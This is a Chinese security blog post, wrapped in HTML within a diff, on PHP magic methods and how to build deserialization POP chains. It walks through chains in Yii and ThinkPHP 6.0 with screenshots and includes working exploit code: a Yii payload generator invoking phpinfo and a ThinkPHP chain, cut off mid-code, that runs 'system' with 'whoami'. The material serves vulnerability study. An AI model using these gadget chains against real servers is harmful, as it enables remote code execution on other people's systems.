@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-corner-indicator.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="序列化知识点整理">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php魔术方法及pop链构造">
+<meta property="og:url" content="http://yoursite.com/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/index.html">
+<meta property="og:site_name" content="be a J0K1R">
+<meta property="og:description" content="序列化知识点整理">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/1.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/2.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/3.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/4.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/5.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/6.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/7.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/8.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/10.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/9.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/11.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/12.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/14.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/15.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/18.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/17.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/16.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/19.png">
+<meta property="article:published_time" content="2021-01-19T07:45:53.000Z">
+<meta property="article:modified_time" content="2021-01-22T16:55:39.379Z">
+<meta property="article:author" content="Peguin">
+<meta property="article:tag" content="review">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/1.png">
+
+<link rel="canonical" href="http://yoursite.com/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>php魔术方法及pop链构造 | be a J0K1R</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="be a J0K1R" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">be a J0K1R</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="Peguin">
+      <meta itemprop="description" content="敢于去想，才会有MEteor的光芒闪耀。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="be a J0K1R">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          php魔术方法及pop链构造
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-01-19 15:45:53" itemprop="dateCreated datePublished" datetime="2021-01-19T15:45:53+08:00">2021-01-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-01-23 00:55:39" itemprop="dateModified" datetime="2021-01-23T00:55:39+08:00">2021-01-23</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="序列化知识点整理"><a href="#序列化知识点整理" class="headerlink" title="序列化知识点整理"></a>序列化知识点整理<a id="more"></a></h2><h3 id="核心部分：php魔术方法"><a href="#核心部分：php魔术方法" class="headerlink" title="核心部分：php魔术方法"></a>核心部分：php魔术方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__construct():构造函数，在每次创建新对象时先调用此方法</span><br><span class="line">__destruct():析构函数</span><br><span class="line">__call():在对象中调用不可访问的方法时调用</span><br><span class="line">__callStatic():在静态上下文中调用不可访问方法时调用</span><br><span class="line">__set():在给不可访问属性赋值时调用（private属性）</span><br><span class="line">__get():读取不可访问属性赋值时调用（private属性）</span><br><span class="line">__isset():当对不可访问属性调用isset()或者empty()时会被调用</span><br><span class="line">__unset():当对不可访问属性调用unset()时会被调用</span><br><span class="line">__sleep():执行serialize()时，会先被调用</span><br><span class="line">__wakeup():执行unserialize()时会先被调用</span><br><span class="line">__toString():类被当作字符串处理时会被调用</span><br><span class="line">__invoke():类被被当作函数调用时会被调用</span><br><span class="line">__set_state():调用var_export()导出类时，此静态方法会被调用。</span><br><span class="line">__clone():当对象复制完成时调用(调用了clone内置方法)</span><br><span class="line">__autoload():尝试加载未定义的类</span><br><span class="line">__debugInfo():打印所需调试信息</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="反序列化与pop链"><a href="#反序列化与pop链" class="headerlink" title="反序列化与pop链"></a>反序列化与pop链</h3><p>在审计框架漏洞的时候，可以从<code>Composer.json</code>入手</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">关于composer</span><br><span class="line">Composer是PHP用来管理依赖（dependency）关系的工具。你可以在自己的项目中声明所依赖的外部工具库（libraries），Composer 会帮你安装这些依赖的库文件。</span><br><span class="line">地址：https:&#x2F;&#x2F;www.phpcomposer.com&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>通过查看<code>composer.json</code>可以寻找pop组件，该文件中写明了应用需要的使用的库，<code>unserialize()</code>函数能使用所有依赖库中的类,这就导致攻击面增大了</p>
+<h3 id="php序列化处理器"><a href="#php序列化处理器" class="headerlink" title="php序列化处理器"></a><code>php</code>序列化处理器</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</span><br><span class="line">php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</span><br><span class="line">php_serialize(php&gt;<span class="number">5.5</span><span class="number">.4</span>):存储方式是，经过serialize()函数序列化处理的值</span><br></pre></td></tr></table></figure>
+
+<p>在存储数据和读取数据时使用不同的处理器导致可以伪造任意数据</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">'ryat'</span>] = <span class="string">'|O:8:"stdClass":0:&#123;&#125;'</span>;</span><br><span class="line">php_serialize处理</span><br><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"ryat"</span>;s:<span class="number">20</span>:<span class="string">"|O:8:"</span>stdClass<span class="string">":0:&#123;&#125;"</span>;&#125;</span><br><span class="line">php读取</span><br><span class="line"><span class="comment">// var_dump($_SESSION);</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">"a:1:&#123;s:4:"</span>ryat<span class="string">";s:20:"</span><span class="string">"]=&gt;</span></span><br><span class="line"><span class="string">  object(stdClass)#1 (0) &#123;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">//由于|字符导致实例化stdClass对象</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="审计pop链的思路"><a href="#审计pop链的思路" class="headerlink" title="审计pop链的思路"></a>审计pop链的思路</h3><ol>
+<li><p>全局搜索<code>__destruct()</code>或者<code>__wakeup()</code>魔术方法入手</p>
+</li>
+<li><p>跟着函数追踪调用过程,注意找可控点(可寻找跳板，<code>__call()、__get()</code>)</p>
+</li>
+<li><p>根据整个pop链的调用构造exp</p>
+</li>
+<li><p>exp序列化数据传给反序列化入口点</p>
+</li>
+</ol>
+<h3 id="以yii5-7和thinkphp6pop链为例"><a href="#以yii5-7和thinkphp6pop链为例" class="headerlink" title="以yii5.7和thinkphp6pop链为例"></a>以yii5.7和thinkphp6pop链为例</h3><p>yii5.7</p>
+<p>起手，全局搜索<code>__destruct()</code>，这里找到<code>basic/vendor/yiisoft/yii2/db/BatchQueryResult.php</code></p>
+<img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/1.png" class="">
+
+<p>跟进<code>reset</code>方法，</p>
+<img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/2.png" class="">
+
+<p>这里的<code>$this-&gt;_dataReader</code>可控，跟进一下<code>close()</code>方法，发现断了</p>
+<p>这里就要想到别的方法来继续接上链子，全局搜索<code>__call()</code>魔术方法，只要对应的类中不存在<code>close()</code>方法，就会调用<code>__call()</code>方法</p>
+<p>找到的是<code>vendor/fzaninotto/faker/src/Faker/Generator.php</code></p>
+<img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/3.png" class="">
+
+<p>跟进<code>format</code>方法</p>
+<img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/4.png" class="">
+
+<p>继续跟进<code>getFormatter</code>方法</p>
+<img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/5.png" class="">
+
+<p><code>$this-&gt;formatters[$formatter]</code>作为函数返回值可控，此时<code>$formatter</code>为<code>close</code>,<code>$argument</code>初始化为空数组</p>
+<p>``vendor/fzaninotto/faker/src/Faker/Generator.php<code>中</code>call_user_func_array<code>函数相当于调用了一个无参的函数，通过正则表达式来寻找调用</code>call_user_func`的无参函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> \<span class="title">w</span>+\<span class="params">(\)</span> ?\<span class="title">n</span>?\</span>&#123;(.*\n)+call_user_func</span><br></pre></td></tr></table></figure>
+
+<p><code>找到vendor\yiisoft\yii2\rest\CreateAction.php</code>中的<code>run()</code>方法</p>
+<img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/6.png" class="">
+
+<p><code>$this-&gt;checkAccess</code>和<code>$this-&gt;id</code>可控,就可以rce了</p>
+<p>整个pop链</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yii\db\BatchQueryResult::__destruct() -&gt; Faker\Generator::__call() -&gt; yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure>
+
+<p>构造exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">        <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">            <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">            <span class="keyword">public</span> $id;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">'phpinfo'</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">'1'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">            <span class="keyword">protected</span> $formatters;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;formatters[<span class="string">'close'</span>] = [<span class="keyword">new</span> CreateAction(),<span class="string">'run'</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">            <span class="keyword">public</span> $_dataReader;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> Generator();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> &#123;</span><br><span class="line">        <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>thinkphp6.0</p>
+<p>全局搜索<code>__destruct()</code>,<code>vendor/topthink/think-orm/src/Model.php</code>找到起点</p>
+<img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/7.png" class="">
+
+<p><code>$this-&gt;lazySave</code>可控，需要为<code>true</code>，跟进<code>save</code>函数</p>
+<img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/8.png" class="">
+
+<p>可以看到想要走下去不能直接让函数返回false，也就是<code>$this-&gt;isEmpty()==true&amp;&amp;$this-&gt;trigger(&#39;BeforeWrite&#39;)!=false</code></p>
+<p>分别跟进</p>
+<img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/10.png" class="">
+
+<img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/9.png" class="">
+
+<p><code>isEmpty()</code>返回值为false，要让<code>$this-&gt;data</code>为非空数组，<code>$this-&gt;wiehEvent==false</code>就能让返回值为true</p>
+<p>接着回到<code>save()</code>函数往下走</p>
+<p><code>$this-&gt;exists</code>可控，这边分别跟进之后，让<code>$this-&gt;exists</code>为true，接着跟进<code>updateData()</code>函数</p>
+<img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/11.png" class="">
+
+<p>前面的<code>if</code>条件直接可以跳过，前面已经满足了跳过条件</p>
+<p>接着跟进<code>getChangedData()</code>函数，<code>checkData()</code>函数没有任何返回值，直接跳过</p>
+<img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/12.png" class="">
+
+<p>这里要直接返回<code>$this-&gt;data</code>，<code>$this-&gt;force</code>可控置为<code>true</code></p>
+<p><code>updateData()</code>函数接着往下，跟进<code>checkAllowFields()</code>函数</p>
+<img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/14.png" class="">
+
+<p><code>$this-&gt;field</code>和<code>$this-&gt;schema</code>默认为空，进入else条件</p>
+<p>跟进<code>db()</code>函数</p>
+<p>这里进行了字符串的拼接，实例化一个类就可以调用<code>__toString()</code>魔术方法</p>
+<p>全局搜索<code>__toString()</code>,找到<code>topthink/think-orm/src/model/concern/Conversion.php</code></p>
+<img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/15.png" class="">
+
+<p>跟进<code>toJson()</code>,继续跟进<code>toArray()</code>,下面就是接着跟进一直到<code>getValue</code>方法</p>
+<img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/18.png" class="">
+
+<img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/17.png" class="">
+
+<img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/16.png" class="">
+
+<p>满足<code>$this-&gt;withAttr[$key]</code>存在且<code>$this-&gt;withAttr[$key]</code>不为数组就可以触发命令执行</p>
+<p>最终会把<code>$this-&gt;withAttr[$key]</code>作为函数名动态执行函数，而<code>$value</code>作为参数，就可以利用执行系统函数达到命令执行</p>
+<p>整条链子</p>
+<img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/19.png" class="">
+
+<p>exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>;</span><br><span class="line"><span class="keyword">trait</span> Attribute&#123;</span><br><span class="line">    <span class="keyword">private</span> $data = [<span class="string">"peguin"</span>=&gt;<span class="string">"whoami"</span>];</span><br><span class="line">    <span class="keyword">private</span> $withAttr = [<span class="string">"peguin"</span>=&gt;<span class="string">"system"</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">private</span> $lazySave;<span class="comment">//True</span></span><br><span class="line">    <span class="keyword">private</span> $exists;<span class="comment">//True</span></span><br><span class="line">    <span class="keyword">protected</span> $withEvent;<span class="comment">//False</span></span><br><span class="line">    <span class="comment">// private $data;//非空数组</span></span><br><span class="line">    <span class="keyword">private</span> $force;<span class="comment">//强制为True</span></span><br><span class="line">    <span class="comment">//schema,field默认为空不需要构造</span></span><br><span class="line">    <span class="keyword">protected</span> $table;<span class="comment">//为空</span></span><br><span class="line"><span class="comment">//toArray中，$data来源于$this-&gt;data,$data[key]=&gt;getAttr($key)，key值为同一个</span></span><br><span class="line"><span class="comment">//getAttr=&gt;getData 